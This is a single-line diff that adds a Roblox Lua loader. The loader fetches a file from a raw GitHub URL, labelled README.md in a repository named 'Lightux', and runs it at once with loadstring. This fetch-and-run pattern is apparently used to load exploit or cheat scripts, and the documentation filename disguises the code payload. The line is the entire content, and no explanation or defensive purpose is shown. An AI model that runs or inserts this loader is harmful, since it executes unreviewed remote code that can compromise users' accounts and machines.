@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/cool83birdcarfly02six/Lightux/main/README.md"),true))()
